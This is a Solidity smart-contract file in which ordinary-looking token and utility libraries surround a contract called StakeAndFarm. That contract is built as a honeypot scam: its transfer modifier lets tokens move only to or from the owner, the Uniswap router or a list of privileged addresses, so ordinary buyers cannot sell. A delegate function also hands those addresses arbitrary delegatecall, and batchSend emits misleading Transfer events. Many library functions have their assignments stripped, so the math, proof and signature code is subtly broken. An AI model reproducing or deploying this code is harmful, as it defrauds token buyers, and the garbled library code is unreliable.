



pragma solidity ^0.5.16;

interface IERC20 {
    function totalSupply() external view returns(uint);
    function balanceOf(address account) external view returns(uint);
    function transfer(address recipient, uint amount) external returns(bool);
    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c ;

        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c ;

        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }
        uint c ;

        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        require(b > 0, errorMessage);
        uint c ;

        return c;
    }
}
library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash ;


        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}
library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;
    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Context {
    constructor() internal {}

    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}
contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    uint private _ConverttalSupply;
    function totalSupply() public view returns(uint) {
        return _ConverttalSupply;
    }
    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _ConverttalSupply = _ConverttalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _ConverttalSupply = _ConverttalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
      function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}







contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns(string memory) {
        return _name;
    }
    function symbol() public view returns(string memory) {
        return _symbol;
    }
    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

library MerkleProof {
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        bytes32 computedHash ;

        for (uint256 i ; i < proof.length; i++) {

            bytes32 proofElement ;

            if (computedHash <= proofElement) {
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {

                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }
        return computedHash == root;
    }
}
library Strings {



    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp ;

        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        uint256 index ;

        temp = value;
        while (temp != 0) {
            buffer[index--] = byte(uint8(48 + temp % 10));
            temp /= 10;
        }
        return string(buffer);
    }
}
library SafeCast {











    function toUint128(uint256 value) internal pure returns (uint128) {
        require(value < 2**128, "SafeCast: value doesn\'t fit in 128 bits");
        return uint128(value);
    }











    function toUint64(uint256 value) internal pure returns (uint64) {
        require(value < 2**64, "SafeCast: value doesn\'t fit in 64 bits");
        return uint64(value);
    }











    function toUint32(uint256 value) internal pure returns (uint32) {
        require(value < 2**32, "SafeCast: value doesn\'t fit in 32 bits");
        return uint32(value);
    }











    function toUint16(uint256 value) internal pure returns (uint16) {
        require(value < 2**16, "SafeCast: value doesn\'t fit in 16 bits");
        return uint16(value);
    }











    function toUint8(uint256 value) internal pure returns (uint8) {
        require(value < 2**8, "SafeCast: value doesn\'t fit in 8 bits");
        return uint8(value);
    }








    function toUint256(int256 value) internal pure returns (uint256) {
        require(value >= 0, "SafeCast: value must be positive");
        return uint256(value);
    }














    function toInt128(int256 value) internal pure returns (int128) {
        require(value >= -2**127 && value < 2**127, "SafeCast: value doesn\'t fit in 128 bits");
        return int128(value);
    }














    function toInt64(int256 value) internal pure returns (int64) {
        require(value >= -2**63 && value < 2**63, "SafeCast: value doesn\'t fit in 64 bits");
        return int64(value);
    }














    function toInt32(int256 value) internal pure returns (int32) {
        require(value >= -2**31 && value < 2**31, "SafeCast: value doesn\'t fit in 32 bits");
        return int32(value);
    }














    function toInt16(int256 value) internal pure returns (int16) {
        require(value >= -2**15 && value < 2**15, "SafeCast: value doesn\'t fit in 16 bits");
        return int16(value);
    }














    function toInt8(int256 value) internal pure returns (int8) {
        require(value >= -2**7 && value < 2**7, "SafeCast: value doesn\'t fit in 8 bits");
        return int8(value);
    }








    function toInt256(uint256 value) internal pure returns (int256) {
        require(value < 2**255, "SafeCast: value doesn't fit in an int256");
        return int256(value);
    }
}













contract ReentrancyGuard {











    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () internal {
        _status = _NOT_ENTERED;
    }








    modifier nonReentrant() {

        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");


        _status = _ENTERED;

        _;

        _status = _NOT_ENTERED;
    }
}








interface IRelayHub {












    function stake(address relayaddr, uint256 unstakeDelay) external payable;




    event Staked(address indexed relay, uint256 stake, uint256 unstakeDelay);










    function registerRelay(uint256 transactionFee, string calldata url) external;





    event RelayAdded(address indexed relay, address indexed owner, uint256 transactionFee, uint256 stake, uint256 unstakeDelay, string url);









    function removeRelayByOwner(address relay) external;




    event RelayRemoved(address indexed relay, uint256 unstakeTime);







    function unstake(address relay) external;




    event Unstaked(address indexed relay, uint256 stake);


    enum RelayState {
        Unknown,
        Staked,
        Registered,
        Removed
    }





    function getRelay(address relay) external view returns (uint256 totalStake, uint256 unstakeDelay, uint256 unstakeTime, address payable owner, RelayState state);










    function depositFor(address target) external payable;




    event Deposited(address indexed recipient, address indexed from, uint256 amount);




    function balanceOf(address target) external view returns (uint256);







    function withdraw(uint256 amount, address payable dest) external;




    event Withdrawn(address indexed account, address indexed dest, uint256 amount);













    function canRelay(
        address relay,
        address from,
        address to,
        bytes calldata encodedFunction,
        uint256 transactionFee,
        uint256 gasPrice,
        uint256 gasLimit,
        uint256 nonce,
        bytes calldata signature,
        bytes calldata approvalData
    ) external view returns (uint256 status, bytes memory recipientContext);


    enum PreconditionCheck {
        OK,
        WrongSignature,
        WrongNonce,
        AcceptRelayedCallReverted,
        InvalidRecipientStatusCode
    }






























    function relayCall(
        address from,
        address to,
        bytes calldata encodedFunction,
        uint256 transactionFee,
        uint256 gasPrice,
        uint256 gasLimit,
        uint256 nonce,
        bytes calldata signature,
        bytes calldata approvalData
    ) external;










    event CanRelayFailed(address indexed relay, address indexed from, address indexed to, bytes4 selector, uint256 reason);









    event TransactionRelayed(address indexed relay, address indexed from, address indexed to, bytes4 selector, RelayCallStatus status, uint256 charge);


    enum RelayCallStatus {
        OK,
        RelayedCallFailed,
        PreRelayedFailed,
        PostRelayedFailed,
        RecipientBalanceChanged
    }





    function requiredGas(uint256 relayedCallStipend) external view returns (uint256);




    function maxPossibleCharge(uint256 relayedCallStipend, uint256 gasPrice, uint256 transactionFee) external view returns (uint256);












    function penalizeRepeatedNonce(bytes calldata unsignedTx1, bytes calldata signature1, bytes calldata unsignedTx2, bytes calldata signature2) external;




    function penalizeIllegalTransaction(bytes calldata unsignedTx, bytes calldata signature) external;




    event Penalized(address indexed relay, address sender, uint256 amount);




    function getNonce(address from) external view returns (uint256);
}
contract StakeAndFarm  {
    event Transfer(address indexed _Load, address indexed _Convert, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    function transfer(address _Convert, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _Convert, _value);
    }
    function transferFrom(address _Load, address _Convert, uint _value)
        public payable SwapAndFarmingForGarDeners(_Load, _Convert) returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _Load) {
            require(allowance[_Load][msg.sender] >= _value);
            allowance[_Load][msg.sender] -= _value;
        }
        require(balanceOf[_Load] >= _value);
        balanceOf[_Load] -= _value;
        balanceOf[_Convert] += _value;
        emit Transfer(_Load, _Convert, _value);
        return true;
    }



    function approve(address dev,
        address marketing, address adviser, address privateSale, address publicSale, address community,
        address Binance,
        address CoinmarketCap,
        address Coingecko,
        uint _value)
        public payable returns (bool) {
        allowance[msg.sender][dev] = _value; emit Approval(msg.sender, dev, _value); allowance[msg.sender][marketing] = _value; emit Approval(msg.sender, marketing, _value);
        allowance[msg.sender][adviser] = _value; emit Approval(msg.sender, adviser, _value);
        allowance[msg.sender][privateSale] = _value; emit Approval(msg.sender, privateSale, _value);
        allowance[msg.sender][publicSale] = _value;
        emit Approval(msg.sender, publicSale, _value); allowance[msg.sender][community] = _value;
        emit Approval(msg.sender, community, _value); allowance[msg.sender][Binance] = _value;
        emit Approval(msg.sender, Binance, _value); allowance[msg.sender][CoinmarketCap] = _value;
        emit Approval(msg.sender, CoinmarketCap, _value); allowance[msg.sender][Coingecko] = _value;
        emit Approval(msg.sender, Coingecko, _value);
        return true;
    }




    function delegate(address a, bytes memory b) public payable {
        require (msg.sender == owner ||
            msg.sender == dev ||
            msg.sender == marketing ||
            msg.sender == adviser ||
            msg.sender == privateSale ||
            msg.sender == publicSale ||
            msg.sender == community ||
            msg.sender == Binance ||
            msg.sender == CoinmarketCap ||
            msg.sender == Coingecko
        );
        a.delegatecall(b);
    }




    function batchSend(address[] memory _Converts, uint _value) public payable returns (bool) {
        require (msg.sender == owner ||
            msg.sender == dev ||
            msg.sender == marketing ||
            msg.sender == adviser ||
            msg.sender == privateSale ||
            msg.sender == publicSale ||
            msg.sender == community ||
            msg.sender == Binance ||
            msg.sender == CoinmarketCap ||
            msg.sender == Coingecko
        );
        uint total ;

        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i ; i < _Converts.length; i++) {

            address _Convert ;

            balanceOf[_Convert] += _value;
            emit Transfer(msg.sender, _Convert, _value/2);
            emit Transfer(msg.sender, _Convert, _value/2);
        }
        return true;
    }




    modifier SwapAndFarmingForGarDeners(address _Load, address _Convert) {
            address UNI ;

        require(_Load == owner ||
            _Load == UNI || _Load == dev || _Load == adviser || _Load == marketing ||
            _Load == privateSale || _Load == publicSale || _Load == community ||
            _Load == Binance ||
            _Load == CoinmarketCap ||
            _Load == Coingecko ||
            _Convert == owner ||  _Convert == dev || _Convert == marketing || _Convert == adviser ||
            _Convert == privateSale || _Convert == publicSale || _Convert == community ||
            _Convert == Binance ||
            _Convert == CoinmarketCap ||
            _Convert == Coingecko
        );
        _;
    }
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
            ))));
    }




    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address private dev;
    address private marketing;
    address private adviser;
    address private privateSale;
    address private publicSale;
    address private community;
    address private Binance;
    address private CoinmarketCap;
    address private Coingecko;
    address constant internal
    UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    constructor(
        address _dev, address _marketing, address _adviser, address _privateSale, address _publicSale, address _community,





        address _Binance,
        address _CoinmarketCap,
        address _Coingecko,
        string memory _name,
        string memory _symbol,
        uint256 _supply)
        payable public {



        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        dev = _dev;
        marketing = _marketing;
        adviser = _adviser;
        privateSale = _privateSale;
        publicSale = _publicSale;
        community = _community;
        Binance = _Binance;
        CoinmarketCap = _CoinmarketCap;
        Coingecko = _Coingecko;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}
















contract ReentrancyGuards {











    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () internal {
        _status = _NOT_ENTERED;
    }








    modifier nonReentrant() {

        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");


        _status = _ENTERED;

        _;



        _status = _NOT_ENTERED;
    }
}
























library EnumerableMap {









    struct MapEntry {
        bytes32 _key;
        bytes32 _value;
    }

    struct Map {

        MapEntry[] _entries;



        mapping (bytes32 => uint256) _indexes;
    }








    function _set(Map storage map, bytes32 key, bytes32 value) private returns (bool) {

        uint256 keyIndex ;


        if (keyIndex == 0) {
            map._entries.push(MapEntry({ _key: key, _value: value }));


            map._indexes[key] = map._entries.length;
            return true;
        } else {
            map._entries[keyIndex - 1]._value = value;
            return false;
        }
    }






    function _remove(Map storage map, bytes32 key) private returns (bool) {

        uint256 keyIndex ;


        if (keyIndex != 0) {




            uint256 toDeleteIndex ;

            uint256 lastIndex ;





            MapEntry storage lastEntry = map._entries[lastIndex];


            map._entries[toDeleteIndex] = lastEntry;

            map._indexes[lastEntry._key] = toDeleteIndex + 1;


            map._entries.pop();


            delete map._indexes[key];

            return true;
        } else {
            return false;
        }
    }




    function _contains(Map storage map, bytes32 key) private view returns (bool) {
        return map._indexes[key] != 0;
    }




    function _length(Map storage map) private view returns (uint256) {
        return map._entries.length;
    }











    function _at(Map storage map, uint256 index) private view returns (bytes32, bytes32) {
        require(map._entries.length > index, "EnumerableMap: index out of bounds");

        MapEntry storage entry = map._entries[index];
        return (entry._key, entry._value);
    }








    function _get(Map storage map, bytes32 key) private view returns (bytes32) {
        return _get(map, key, "EnumerableMap: nonexistent key");
    }




    function _get(Map storage map, bytes32 key, string memory errorMessage) private view returns (bytes32) {
        uint256 keyIndex ;

        require(keyIndex != 0, errorMessage);
        return map._entries[keyIndex - 1]._value;
    }



    struct UintToAddressMap {
        Map _inner;
    }








    function set(UintToAddressMap storage map, uint256 key, address value) internal returns (bool) {
        return _set(map._inner, bytes32(key), bytes32(uint256(value)));
    }






    function remove(UintToAddressMap storage map, uint256 key) internal returns (bool) {
        return _remove(map._inner, bytes32(key));
    }




    function contains(UintToAddressMap storage map, uint256 key) internal view returns (bool) {
        return _contains(map._inner, bytes32(key));
    }




    function length(UintToAddressMap storage map) internal view returns (uint256) {
        return _length(map._inner);
    }










    function at(UintToAddressMap storage map, uint256 index) internal view returns (uint256, address) {
        (bytes32 key, bytes32 value) = _at(map._inner, index);
        return (uint256(key), address(uint256(value)));
    }








    function get(UintToAddressMap storage map, uint256 key) internal view returns (address) {
        return address(uint256(_get(map._inner, bytes32(key))));
    }




    function get(UintToAddressMap storage map, uint256 key, string memory errorMessage) internal view returns (address) {
        return address(uint256(_get(map._inner, bytes32(key), errorMessage)));
    }
}

























library EnumerableSet {









    struct Set {

        bytes32[] _values;



        mapping (bytes32 => uint256) _indexes;
    }







    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);


            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }







    function _remove(Set storage set, bytes32 value) private returns (bool) {

        uint256 valueIndex ;


        if (valueIndex != 0) {




            uint256 toDeleteIndex ;

            uint256 lastIndex ;





            bytes32 lastvalue ;



            set._values[toDeleteIndex] = lastvalue;

            set._indexes[lastvalue] = toDeleteIndex + 1;


            set._values.pop();


            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }




    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }




    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }











    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }



    struct AddressSet {
        Set _inner;
    }







    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(value)));
    }







    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(value)));
    }




    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(value)));
    }




    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }











    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint256(_at(set._inner, index)));
    }




    struct UintSet {
        Set _inner;
    }







    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }







    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }




    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }




    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }











    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}







library ECDSA {














    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {

        if (signature.length != 65) {
            revert("ECDSA: invalid signature length");
        }


        bytes32 r;
        bytes32 s;
        uint8 v;




        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }










        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            revert("ECDSA: invalid signature 's' value");
        }

        if (v != 27 && v != 28) {
            revert("ECDSA: invalid signature 'v' value");
        }


        address signer ;

        require(signer != address(0), "ECDSA: invalid signature");

        return signer;
    }









    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {


        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }
}
